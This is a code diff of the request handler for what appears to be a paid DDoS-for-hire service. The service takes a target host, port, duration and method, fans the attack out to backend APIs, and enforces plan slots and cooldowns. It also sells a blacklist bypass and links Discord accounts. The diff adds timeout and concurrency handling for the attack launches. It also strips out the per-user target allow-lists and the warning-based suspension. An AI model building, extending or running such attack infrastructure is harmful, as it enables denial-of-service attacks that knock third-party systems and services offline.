@@ -4,26 +4,42 @@ import * as Vault from './vault-db.js';
 import { getPayloadMethods, getPayloadBlacklists } from '../payload.js';
 import { getUserLimits, isMethodPermittedForUser } from './policy.js';
 import { generateVerificationCode, buildDiscordRoleNames, userPlanRole } from './discord.js';
-import { formatSlotBar, generateAttackId, validatePayloadLength, buildMessage, buildStructuredData, buildMetadata, checkApiRateLimit, applyGlobalRateLimit } from './helpers.js';
+import { formatSlotBar, generateAttackId, checkApiRateLimit, applyGlobalRateLimit, withTimeout, acquireAttackSlots, releaseAttackSlots, acquireOutgoingRequestSlot, releaseOutgoingRequestSlot } from './helpers.js';
+import { TIMEOUT_CONFIG, CONCURRENCY_CONFIG, APP_DEFAULTS, LOOKUP_SERVICES, USER_LIMITS } from './config.js';
+import { isIPv4, isPrivateIPRange, isReservedDomain, isValidTarget, isUrlTarget, normalizeBlacklistValue, isBlacklistedTarget, isBlacklistedByMetadata, validatePayloadLength } from './validator.js';
 
 let SERVICE_START = null;
 
 async function ipLookup(ipOrHost) {
   try {
-    const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ipOrHost)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+    const lookupUrlTemplate = LOOKUP_SERVICES.IP_LOOKUP_URLS[0] || APP_DEFAULTS.IP_LOOKUP_FALLBACK_URL;
+    const lookupUrl = lookupUrlTemplate.replace('{target}', encodeURIComponent(ipOrHost));
+    const res = await withTimeout(
+      fetch(lookupUrl),
+      TIMEOUT_CONFIG.EXTERNAL_LOOKUP_TIMEOUT_MS,
+      'IP lookup'
+    );
     if (!res.ok) return null;
     const data = await res.json();
     if (data && data.status === 'success') return data;
     return null;
   } catch (e) {
+    console.warn(`IP lookup failed for ${ipOrHost}: ${e.message}`);
     return null;
   }
 }
 
-function buildWarningSummary(user, warnings) {
-  const count = Number(warnings?.count || 0);
-  const limit = Number(warnings?.limit || 5);
-  const suspended = Boolean(user?.suspended || warnings?.suspended);
+// Builds warning summary from user and warning object
+function buildWarningSummary(user, warnings = null) {
+  const base = warnings && typeof warnings === 'object' ? warnings : {
+    count: Number(user?.warning_count || 0),
+    limit: USER_LIMITS.DEFAULT_WARNING_LIMIT,
+    suspended: Boolean(user?.suspended || false),
+    reset_at: user?.warning_reset_at || null
+  };
+  const count = Number(base.count || 0);
+  const limit = Number(base.limit || USER_LIMITS.DEFAULT_WARNING_LIMIT);
+  const suspended = Boolean(user?.suspended || base.suspended);
   const severity = count >= limit ? 'critical' : count >= 3 ? 'high' : count >= 1 ? 'medium' : 'clean';
   return {
     count,
@@ -31,7 +47,7 @@ function buildWarningSummary(user, warnings) {
     suspended,
     severity,
     warn_status: `${count}/${limit}`,
-    label: suspended ? 'account suspended' : count >= limit ? `${count}/${limit} warnings` : `${count}/${limit} warnings`,
+    label: suspended ? 'account suspended' : `${count}/${limit} warnings`,
     detail: suspended ? 'Account is suspended and must be cleared by an admin.' : 'Warnings are tracked for abuse and policy enforcement.'
   };
 }
@@ -73,6 +89,20 @@ async function fanOutMethodApiLinks(methodMeta, record) {
     const url = expandApiLinkTemplate(destination, record);
     const method = String(link?.method || 'GET').toUpperCase();
 
+    // Acquire slot for this outgoing request
+    const slotAcquired = await acquireOutgoingRequestSlot(5000);
+    if (!slotAcquired) {
+      outcomes.push({
+        name: link?.name || 'api_link',
+        url,
+        method,
+        status: 0,
+        ok: false,
+        error: 'outgoing_request_limit_exceeded'
+      });
+      continue;
+    }
+
     try {
       const init = {
         method,
@@ -94,7 +124,12 @@ async function fanOutMethodApiLinks(methodMeta, record) {
         init.body = params.toString();
       }
 
-      const response = await fetch(url, init);
+      // Wrap fetch with timeout protection for attack launches
+      const response = await withTimeout(
+        fetch(url, init),
+        TIMEOUT_CONFIG.ATTACK_LAUNCH_TIMEOUT_MS,
+        `Attack launch to ${link?.name || 'backend'}`
+      );
       const text = await response.text();
       let payload = null;
       try { payload = text ? JSON.parse(text) : null; } catch (_) { payload = { raw: text }; }
@@ -116,124 +151,24 @@ async function fanOutMethodApiLinks(methodMeta, record) {
         ok: false,
         error: e?.message || 'api link failed'
       });
+    } finally {
+      // Always release the outgoing request slot
+      releaseOutgoingRequestSlot();
     }
   }
 
   return outcomes;
 }
 
-function isIPv4(value) {
-  return typeof value === 'string' && /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/.test(value);
-}
+// IP and blacklist validation functions moved to validator.js
+// Import: isIPv4, isPrivateIPRange, isReservedDomain, isValidTarget, isUrlTarget, normalizeBlacklistValue, isBlacklistedTarget, isBlacklistedByMetadata
 
-function isPrivateIPRange(ip) {
-  // Check for private/reserved IP ranges
-  const privateRanges = [
-    /^127\./, // Loopback
-    /^10\./, // Private class A
-    /^172\.(1[6-9]|2\d|3[01])\./, // Private class B
-    /^192\.168\./, // Private class C
-    /^169\.254\./, // Link-local
-    /^224\./, // Multicast
-    /^255\./, // Broadcast
-    /^0\./ // Current network
-  ];
-  return privateRanges.some(range => range.test(ip));
-}
-
-function isReservedDomain(domain) {
-  const normalizedDomain = domain.toLowerCase().trim();
-  const reservedDomains = [
-    'localhost',
-    '.localhost',
-    '.local',
-    '.test',
-    '.invalid',
-    '.example',
-    '.internal',
-    '0.0.0.0',
-    '255.255.255.255'
-  ];
-  return reservedDomains.some(reserved => 
-    normalizedDomain === reserved || 
-    normalizedDomain.endsWith(reserved)
-  );
-}
-
-function isValidTarget(target) {
-  if (!target || typeof target !== 'string') return false;
-  const trimmed = target.trim();
-  if (!trimmed || trimmed.length === 0) return false;
-  if (trimmed.length > 255) return false;
-  if (trimmed.includes(' ') || trimmed.includes('\n') || trimmed.includes('\r')) return false;
-  
-  // Check format
-  const isIP = isIPv4(trimmed);
-  const isURL = isUrlTarget(trimmed);
-  if (!isIP && !isURL) return false;
-  
-  // Check for private/reserved
-  if (isIP && isPrivateIPRange(trimmed)) return false;
-  if (isURL && isReservedDomain(trimmed)) return false;
-  
-  return true;
-}
-
-function isUrlTarget(value) {
-  if (typeof value !== 'string' || !value.trim()) return false;
-  if (isIPv4(value)) return false;
-  if (value.includes(' ')) return false;
-  return value.includes('.') || /^https?:\/\//i.test(value);
-}
-
-function normalizeBlacklistValue(value) {
-  return String(value || '').trim().toLowerCase();
-}
-
-function isBlacklistedTarget(target, blacklistEntries) {
-  const normalizedTarget = normalizeBlacklistValue(target);
-  if (!normalizedTarget) return false;
-
-  return (blacklistEntries || []).some((entry) => {
-    const normalizedEntry = normalizeBlacklistValue(entry);
-    if (!normalizedEntry) return false;
-
-    const isIpPrefix = /^((\d{1,3}\.){1,3}\d{1,3})\.?$/.test(normalizedEntry);
-    if (isIpPrefix) {
-      const prefix = normalizedEntry.endsWith('.') ? normalizedEntry : `${normalizedEntry}.`;
-      return normalizedTarget === normalizedEntry || normalizedTarget.startsWith(prefix) || normalizedEntry.startsWith(normalizedTarget);
-    }
-
-    return normalizedTarget === normalizedEntry
-      || normalizedTarget.startsWith(normalizedEntry)
-      || normalizedTarget.includes(normalizedEntry)
-      || (normalizedEntry.startsWith('.') && normalizedTarget.endsWith(normalizedEntry))
-      || normalizedEntry.startsWith(normalizedTarget);
-  });
-}
-
-function isBlacklistedByMetadata(ipinfo, payloadBlacklists) {
-  const blacklists = payloadBlacklists || {};
-  const asnNumbers = (blacklists.ASN_NUMBER || []).map(normalizeBlacklistValue).filter(Boolean);
-  const asnNames = (blacklists.ASN_NAME || []).map(normalizeBlacklistValue).filter(Boolean);
-  const countries = (blacklists.Countries || []).map(normalizeBlacklistValue).filter(Boolean);
-
-  const asnValue = normalizeBlacklistValue(ipinfo?.as || ipinfo?.asn || '');
-  const orgValue = normalizeBlacklistValue(ipinfo?.org || ipinfo?.isp || '');
-  const countryCode = normalizeBlacklistValue(ipinfo?.countryCode || '');
-  const countryName = normalizeBlacklistValue(ipinfo?.country || '');
-
-  return asnNumbers.some((value) => asnValue === value || asnValue.includes(value))
-    || asnNames.some((value) => orgValue === value || orgValue.includes(value))
-    || countries.some((value) => countryCode === value || countryName === value);
-}
-
-export async function apiHandler(parts, request, env) {
+export async function apiHandler(parts, request, env, requestId, logger, requestContext = {}) {
   const q = parseQuery(request);
   const endpoint = parts[0] || '';
   const GLOBAL_API_SLOTS = Number(env.GLOBAL_API_SLOTS || 30);
 
-  let requestUser = null;
+  let requestUser = requestContext.user || null;
 
   // Only protect sensitive endpoints. Public endpoints (network_statistics, endpoints/docs/help,
   // methods, graph, discord_profile, link, unlink, view_ongoing, my_attacks, view_plan) should be
@@ -334,8 +269,6 @@ export async function apiHandler(parts, request, env) {
     const total = users.length;
     const activeUsers = users.filter((user) => !user.suspended).length;
     const suspendedUsers = users.filter((user) => user.suspended).length;
-    const warnings = await Promise.all(users.map(async (user) => ({ user, warning: await Vault.getUserWarnings(env, user.username) })));
-    const warningCount = warnings.reduce((sum, item) => sum + Number(item.warning?.count || 0), 0);
     const ongoing = await Vault.countOngoing(env);
     const attacksToday = await Vault.countLogsToday(env);
     const vipUsers = await Vault.countUsersByFlag(env, 'vip');
@@ -361,15 +294,15 @@ export async function apiHandler(parts, request, env) {
         attacks_are_enabled: !attacksDisabled,
         total_ongoing_attacks: ongoing,
         total_attacks_today: attacksToday,
-        total_warning_count: warningCount,
+        total_warning_count: 0,
         verified_discord_users_count: verifiedDiscordUsers,
         max_attack_api_slots: GLOBAL_API_SLOTS,
         health_status: healthStatus,
         maintenance_mode: maintenanceMode,
-        src_name: 'CAPI',
+        src_name: APP_DEFAULTS.SRC_NAME,
         src_uptime: 'up'
       }
-    }, 200, { service: env.API_NAME || 'CAPI' });
+    }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
 
@@ -378,7 +311,7 @@ export async function apiHandler(parts, request, env) {
       error: false,
       message: 'endpoint catalog loaded',
       data: {
-        base_url: env.API_BASE_URL || 'https://capi.capysploit.workers.dev',
+        base_url: env.API_BASE_URL || APP_DEFAULTS.API_BASE_URL,
         endpoints: [
           { name: 'GET /api/attack', description: 'Launch an attack', usage: '?username=demo&host=1.1.1.1&port=80&time=60&method=udp' },
           { name: 'GET /api/discord_profile', description: 'Show the linked profile for a Discord user', usage: '?discord_user_id=123456789' },
@@ -389,7 +322,7 @@ export async function apiHandler(parts, request, env) {
           { name: 'GET /admin/list_methods', description: 'List available methods', usage: '' }
         ]
       }
-    }, 200, { service: env.API_NAME || 'CAPI' });
+    }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'graph') {
@@ -461,7 +394,7 @@ export async function apiHandler(parts, request, env) {
         uptime,
         updated_at: new Date().toISOString()
       }
-    }, 200, { service: env.API_NAME || 'CAPI' });
+    }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'methods') {
@@ -478,7 +411,6 @@ export async function apiHandler(parts, request, env) {
         description: method?.description || meta?.description || `${method?.name || 'method'} method`,
         target_type: meta?.target_type || null,
         default_port: meta?.default_port || null,
-        min_time: meta?.min_time || null,
         max_time: meta?.max_time || null,
         max_concurrents: meta?.max_concurrents || null,
         max_slots: meta?.max_slots || null
@@ -495,12 +427,11 @@ export async function apiHandler(parts, request, env) {
     const discordUserId = q.discord_user_id || q.discord_id || q.user_id;
     if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to lookup your linked profile.' });
     const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
-    if (!link) return jsonResponse({ error: true, message: 'Discord account not linked. Use /link to verify your account first; /plan is only available for linked users.', client: null }, 404, { service: env.API_NAME || 'CAPI' });
+    if (!link) return jsonResponse({ error: true, message: 'Discord account not linked. Use /link to verify your account first; /plan is only available for linked users.', client: null }, 404, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
     const user = await Vault.getUser(env, link.username);
-    if (!user) return jsonResponse({ error: true, message: 'Linked user account no longer exists.' }, 500, { service: env.API_NAME || 'CAPI' });
-    const warnings = await Vault.getUserWarnings(env, user.username);
-    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
-    const warningSummary = buildWarningSummary(user, warnings);
+    if (!user) return jsonResponse({ error: true, message: 'Linked user account no longer exists.' }, 500, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    const serviceName = await resolveServiceName(user, env, env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME);
+    const warningSummary = await Vault.getUserWarningSummary(env, user.username);
     const discordLink = await Vault.getDiscordLinkByUsername(env, user.username);
     return jsonResponse({
       error: false,
@@ -513,8 +444,7 @@ export async function apiHandler(parts, request, env) {
           holder: Boolean(user.holder),
           reseller: Boolean(user.reseller),
           max_time: Number(user.max_time || 60),
-          min_time: Number(user.min_time || 30),
-          cooldown: Number(user.cooldown || 45),
+          cooldown: Number(user.cooldown || 10),
           max_concurrents: Number(user.max_concurrents || 1),
           max_daily_attacks: Number(user.max_daily_attacks || 100),
           suspended: Boolean(user.suspended),
@@ -545,10 +475,10 @@ export async function apiHandler(parts, request, env) {
     if (!username || !password || !client) return makePolishedError('missing username, password or client', 400, { hint: 'Send username, password and client=discord in the query string.' });
 
     const user = await Vault.getUser(env, username);
-    if (!user) return jsonResponse({ error: true, message: 'user does not exist', client, code: null }, 404, { service: env.API_NAME || 'CAPI' });
-    if (user.password !== password) return jsonResponse({ error: true, message: 'wrong password', client, code: null }, 401, { service: env.API_NAME || 'CAPI' });
-    if (user.suspended) return jsonResponse({ error: true, message: 'account suspended', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });
-    if (!user.api_access) return jsonResponse({ error: true, message: 'api access disabled', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });
+    if (!user) return jsonResponse({ error: true, message: 'user does not exist', client, code: null }, 404, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (user.password !== password) return jsonResponse({ error: true, message: 'wrong password', client, code: null }, 401, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (user.suspended) return jsonResponse({ error: true, message: 'account suspended', client, code: null }, 403, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (!user.api_access) return jsonResponse({ error: true, message: 'api access disabled', client, code: null }, 403, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
 
     const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, username);
     if (existingVerified) {
@@ -562,13 +492,13 @@ export async function apiHandler(parts, request, env) {
           discord_username: existingVerified.discord_username,
           verified_at: existingVerified.verified_at
         }
-      }, 409, { service: env.API_NAME || 'CAPI' });
+      }, 409, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
     }
 
     const code = generateVerificationCode();
     const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
     await Vault.createDiscordLinkRequest(env, username, client, code, expiresAt);
-    return jsonResponse({ error: false, message: 'verification code generated', client, code, expires_at: expiresAt }, 200, { service: env.API_NAME || 'CAPI' });
+    return jsonResponse({ error: false, message: 'verification code generated', client, code, expires_at: expiresAt }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'link') {
@@ -590,14 +520,14 @@ export async function apiHandler(parts, request, env) {
         client,
         code: null,
         discord_link: { username: existingDiscordLink.username, discord_user_id: discordUserId, discord_username: existingDiscordLink.discord_username }
-      }, 409, { service: env.API_NAME || 'CAPI' });
+      }, 409, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
     }
 
     const requestRow = await Vault.getDiscordLinkByCode(env, code);
-    if (!requestRow) return jsonResponse({ error: true, message: 'invalid or unknown code', client, code }, 404, { service: env.API_NAME || 'CAPI' });
-    if (requestRow.client !== client) return jsonResponse({ error: true, message: 'client mismatch', client, code }, 400, { service: env.API_NAME || 'CAPI' });
-    if (requestRow.status === 'verified') return jsonResponse({ error: true, message: 'code already used', client, code }, 409, { service: env.API_NAME || 'CAPI' });
-    if (new Date() > new Date(requestRow.expires_at)) return jsonResponse({ error: true, message: 'code expired', client, code }, 410, { service: env.API_NAME || 'CAPI' });
+    if (!requestRow) return jsonResponse({ error: true, message: 'invalid or unknown code', client, code }, 404, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (requestRow.client !== client) return jsonResponse({ error: true, message: 'client mismatch', client, code }, 400, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (requestRow.status === 'verified') return jsonResponse({ error: true, message: 'code already used', client, code }, 409, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    if (new Date() > new Date(requestRow.expires_at)) return jsonResponse({ error: true, message: 'code expired', client, code }, 410, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
 
     const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, requestRow.username);
     if (existingVerified) {
@@ -607,16 +537,16 @@ export async function apiHandler(parts, request, env) {
         client,
         code,
         discord_link: { username: existingVerified.username, discord_user_id: existingVerified.discord_user_id, discord_username: existingVerified.discord_username }
-      }, 409, { service: env.API_NAME || 'CAPI' });
+      }, 409, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
     }
 
     const verifiedRow = await Vault.verifyDiscordLinkCode(env, code, discordUserId, discordUsername);
     const linkedUser = await Vault.getUser(env, verifiedRow.username);
-    if (!linkedUser) return jsonResponse({ error: true, message: 'linked user no longer exists', client, code }, 500, { service: env.API_NAME || 'CAPI' });
+    if (!linkedUser) return jsonResponse({ error: true, message: 'linked user no longer exists', client, code }, 500, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
 
     const roles = buildDiscordRoleNames(linkedUser, env);
     const planRole = userPlanRole(linkedUser, env);
-    return jsonResponse({ error: false, message: 'discord account verified', client, code, discord_user_id: discordUserId, username: linkedUser.username, roles, plan_role: planRole }, 200, { service: env.API_NAME || 'CAPI' });
+    return jsonResponse({ error: false, message: 'discord account verified', client, code, discord_user_id: discordUserId, username: linkedUser.username, roles, plan_role: planRole }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'unlink') {
@@ -626,10 +556,10 @@ export async function apiHandler(parts, request, env) {
     const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
     if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to remove your Discord link.' });
     const existingLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
-    if (!existingLink) return jsonResponse({ error: true, message: 'Discord account is not currently linked. Use /link to verify first.' }, 404, { service: env.API_NAME || 'CAPI' });
+    if (!existingLink) return jsonResponse({ error: true, message: 'Discord account is not currently linked. Use /link to verify first.' }, 404, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
     const unlinked = await Vault.unlinkDiscordLinkByDiscordId(env, discordUserId, 'self');
-    if (!unlinked) return jsonResponse({ error: true, message: 'Unable to unlink Discord account at this time.', service: env.API_NAME || 'CAPI' }, 500, { service: env.API_NAME || 'CAPI' });
-    return jsonResponse({ error: false, message: 'Discord account unlinked successfully.', discord_user_id: discordUserId, discord_username: unlinked.discord_username, username: unlinked.username, unlinked_at: unlinked.unlinked_at }, 200, { service: env.API_NAME || 'CAPI' });
+    if (!unlinked) return jsonResponse({ error: true, message: 'Unable to unlink Discord account at this time.', service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME }, 500, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
+    return jsonResponse({ error: false, message: 'Discord account unlinked successfully.', discord_user_id: discordUserId, discord_username: unlinked.discord_username, username: unlinked.username, unlinked_at: unlinked.unlinked_at }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'view_plan') {
@@ -649,9 +579,7 @@ export async function apiHandler(parts, request, env) {
       );
     }
     
-    const warnings = await Vault.getUserWarnings(env, u.username);
-    const serviceName = await resolveServiceName(u, env, env.API_NAME || 'CAPI');
-    const warningSummary = buildWarningSummary(u, warnings);
+    const serviceName = await resolveServiceName(u, env, env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME);
     const discordLink = await Vault.getVerifiedDiscordLinkByUsername(env, u.username);
     const attacksToday = await Vault.countUserDailyAttacks(env, u.username);
     const attacksRemaining = Math.max(0, Number(u.max_daily_attacks || 0) - Number(attacksToday || 0));
@@ -680,22 +608,20 @@ export async function apiHandler(parts, request, env) {
         owner: Boolean(u.owner || false),
         api: Boolean(u.api_access),
         max_time: Number(u.max_time || 60),
-        min_time: Number(u.min_time || 30),
-        cooldown: Number(u.cooldown || 45),
+        cooldown: Number(u.cooldown || 10),
         max_concurrents: Number(u.max_concurrents || 1),
         max_daily_attacks: Number(u.max_daily_attacks || 100),
         attacks_remaining: attacksRemaining,
         power_saving: Boolean(u.power_saving || 1),
         bypass_power: !Boolean(u.power_saving || 1),
         bypass_anti_spam: Boolean(u.bypass_anti_spam || false),
-        bypass_blacklist: Boolean(user.bypass_blacklist || false),
+        bypass_blacklist: Boolean(u.bypass_blacklist || false),
         suspended: Boolean(u.suspended),
         created_by: u.created_by || null,
         creation_date: createdAt,
         expiry_unix: Number(u.expiry_unix || 0),
         formatted_expiry: expiryDate,
         service_name: serviceName,
-        warnings: Number(warningSummary.count || 0),
         plan_type: planType,
         rank: rank,
         discord_linked: discordLink ? discordLink.discord_user_id : null
@@ -738,7 +664,7 @@ export async function apiHandler(parts, request, env) {
     // Return recent/ongoing for this user
     const limit = Number(qv.limit || 10);
     const recent = await Vault.getRecentAttacks(env, username, limit);
-    return jsonResponse({ error: false, user_only: true, ongoing: recent || [] }, 200, { service: env.API_NAME || 'CAPI' });
+    return jsonResponse({ error: false, user_only: true, ongoing: recent || [] }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   if (endpoint === 'my_attacks') {
@@ -777,7 +703,7 @@ export async function apiHandler(parts, request, env) {
           timestamp: a.created_at || null
         }))
       }
-    }, 200, { service: env.API_NAME || 'CAPI' });
+    }, 200, { service: env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME });
   }
 
   /**
@@ -857,9 +783,8 @@ export async function apiHandler(parts, request, env) {
       if (String(user.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
     }
 
-    const userWarnings = await Vault.getUserWarnings(env, user.username);
-    if (user.suspended || userWarnings.suspended || userWarnings.count >= userWarnings.limit) {
-      return makePolishedError('account suspended', 403, { suspended: true, warn_status: `${userWarnings.count}/${userWarnings.limit}`, hint: 'This account is suspended. Contact an administrator to restore access.' });
+    if (user.suspended) {
+      return makePolishedError('account suspended', 403, { suspended: true, hint: 'This account is suspended. Contact an administrator to restore access.' });
     }
     
     // Check if account has expired
@@ -872,6 +797,14 @@ export async function apiHandler(parts, request, env) {
     }
     
     if (!user.api_access) return makePolishedError('user has no API access', 403, { hint: 'Enable API access for this account before trying again.' });
+
+    // Check IP whitelist if configured
+    if (user.whitelisted_ip) {
+      const requestIp = request.headers?.get?.('cf-connecting-ip') || request.headers?.get?.('x-forwarded-for') || 'unknown';
+      if (requestIp !== user.whitelisted_ip) {
+        return makePolishedError('access denied from this IP address', 403, { ip: requestIp, whitelisted_ip: user.whitelisted_ip, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' });
+      }
+    }
 
     // Check if attacks are globally disabled
     const attacksDisabled = await Vault.getAttacksDisabled(env);
@@ -908,9 +841,6 @@ export async function apiHandler(parts, request, env) {
     const policyResult = isMethodPermittedForUser(user, methodMeta);
     if (!policyResult.allowed) return makePolishedError(`method ${record.method} is blocked by policy (${policyResult.reason})`, 403, { hint: 'Upgrade the account plan or remove the policy restriction for this method.' });
 
-    const allowedMethods = user.allowed_methods ? user.allowed_methods.split(',').map(s => s.trim().toLowerCase()).filter(Boolean) : [];
-    if (allowedMethods.length > 0 && !allowedMethods.includes(record.method)) return makePolishedError(`method ${record.method} is not permitted for this user`, 403, { hint: 'Ask an admin to grant this method to the account.' });
-
     const payloadBlacklists = getPayloadBlacklists();
     const ipinfo = await ipLookup(record.target) || {};
     const blacklistRows = await Vault.listBlacklist(env);
@@ -923,43 +853,27 @@ export async function apiHandler(parts, request, env) {
     if (targetBlocked) {
       // Check if user has bypass_blacklist enabled
       if (!user.bypass_blacklist) {
-        const warning = await Vault.incrementUserWarning(env, record.username, record.target);
+        const warningSummary = await Vault.recordUserWarning(env, user.username, `blacklisted target ${record.target}`);
         return makePolishedError('blacklisted target', 403, {
           target: record.target,
           target_asn: ipinfo.as || ipinfo.org || null,
           target_country: ipinfo.country || null,
           target_country_code: ipinfo.countryCode || null,
-          warn_status: `${warning.count}/5`,
-          suspended: warning.suspended,
-          hint: 'This target is blocked by policy and cannot be used again until the block is cleared.'
+          warn_status: warningSummary.warn_status,
+          suspended: Boolean(warningSummary.suspended || user.suspended),
+          hint: warningSummary.suspended
+            ? 'This account reached 5 warnings and is suspended. Contact an administrator to restore access.'
+            : 'This target is blocked by policy and cannot be used again until the block is cleared.'
         });
       }
       // User has bypass_blacklist - log but allow the attack
       console.warn(`⚠️ User ${record.username} bypassed blacklist for target ${record.target}`);
     }
 
-    if (user.allowed_targets) {
-      const list = user.allowed_targets.split(',').map(s => s.trim()).filter(Boolean);
-      const ok = list.some(a => {
-        if (a === record.target) return true;
-        if (a.endsWith('.') && record.target.startsWith(a)) return true;
-        return false;
-      });
-      if (!ok) return makePolishedError(`target not allowed for this user; allowed: ${list.join(',')}`, 403, { hint: 'Use an approved target from the account allow-list.' });
-    }
-
     const limits = getUserLimits(user);
-    const methodMinTime = Number(methodMeta?.min_time || 0);
     const methodMaxTime = Number(methodMeta?.max_time || 0);
-    const effectiveMinTime = Math.max(limits.minTime, methodMinTime || 0);
     const effectiveMaxTime = methodMaxTime > 0 ? Math.min(limits.maxTime, methodMaxTime) : limits.maxTime;
 
-    if (effectiveMaxTime > 0 && effectiveMinTime > effectiveMaxTime) {
-      return makePolishedError(`cannot use method ${record.method} with current plan time limits`, 400, { hint: `This method requires a minimum time of ${methodMinTime}s, but your account max time is ${limits.maxTime}s.` });
-    }
-    if (record.duration < effectiveMinTime) {
-      return makePolishedError(`requested time is below the minimum allowed time of ${effectiveMinTime}`, 400, { hint: `Increase the duration to at least ${effectiveMinTime} seconds for this method and plan.` });
-    }
     if (effectiveMaxTime > 0 && record.duration > effectiveMaxTime) {
       return makePolishedError(`requested time exceeds the maximum allowed time of ${effectiveMaxTime}`, 400, { hint: `Lower the duration to ${effectiveMaxTime} seconds or less for this method and plan.` });
     }
@@ -970,14 +884,6 @@ export async function apiHandler(parts, request, env) {
     const userOngoing = await Vault.countUserOngoing(env, record.username);
     if ((userOngoing + record.concurrents) > limits.maxConcurrents) return makePolishedError(`requested concurrents would exceed user's allowed concurrents of ${limits.maxConcurrents} (current running: ${userOngoing})`, 400, { hint: 'Lower the concurrency value or wait for running attacks to finish.' });
 
-    const queuedByUser = await Vault.countUserQueued(env, record.username);
-    const remainingUserQueueSlots = Math.max(0, Number(limits.maxConcurrents || 1) - Number(userOngoing || 0));
-    if (remainingUserQueueSlots <= 0 || queuedByUser >= remainingUserQueueSlots) {
-      return makePolishedError('queue limit reached', 429, {
-        hint: `You already have ${queuedByUser} queued request(s) and only ${remainingUserQueueSlots} concurrency slot(s) available right now.`
-      });
-    }
-
     const methodMaxSlots = Number(methodMeta?.max_slots || 0);
     const ongoing = await Vault.countOngoing(env);
     const userBypass = Boolean(user.bypass_slots || 0);
@@ -985,39 +891,28 @@ export async function apiHandler(parts, request, env) {
     if (methodMaxSlots > 0) {
       const methodOngoing = await Vault.countMethodOngoing(env, record.method);
       if (methodOngoing >= methodMaxSlots) {
-        const queuePosition = await Vault.queueAttack(env, record, 'method_slots_full');
-        return jsonResponse({
-          error: false,
-          status: 202,
-          message: `Attack queued. Position #${queuePosition} for ${record.method}.`,
-          data: {
-            queued: true,
-            queue_position: queuePosition,
-            queue_reason: 'method_slots_full',
-            target: record.target,
-            method: record.method,
-            hint: `The ${record.method} method is at capacity (${methodOngoing}/${methodMaxSlots}).`
-          }
-        }, 202);
+        return makePolishedError(`method ${record.method} is at capacity`, 429, {
+          hint: `The ${record.method} method is at capacity (${methodOngoing}/${methodMaxSlots}). Try again when a slot frees up.`
+        });
       }
     }
 
     if (!userBypass && ongoing >= GLOBAL_API_SLOTS) {
-      const queuePosition = await Vault.queueAttack(env, record, 'api_slots_full');
-      return jsonResponse({
-        error: false,
-        status: 202,
-        message: `Attack queued. Position #${queuePosition} due to API load.`,
-        data: {
-          queued: true,
-          queue_position: queuePosition,
-          queue_reason: 'api_slots_full',
-          target: record.target,
-          method: record.method,
-          global_slots_status: `${ongoing}/${GLOBAL_API_SLOTS}`,
-          hint: `All ${GLOBAL_API_SLOTS} API slots are in use.`
-        }
-      }, 202);
+      return makePolishedError('API slots are full', 429, {
+        hint: `All ${GLOBAL_API_SLOTS} API slots are in use. Try again when a slot frees up.`
+      });
+    }
+
+    // Acquire concurrency slots before launching attack
+    if (CONCURRENCY_CONFIG.ENABLED) {
+      const slotCheck = await acquireAttackSlots(record.username, 1, 5000);
+      if (!slotCheck.acquired) {
+        return makePolishedError(slotCheck.hint || 'Concurrency limit reached', 429, {
+          reason: slotCheck.reason,
+          global_capacity: slotCheck.global,
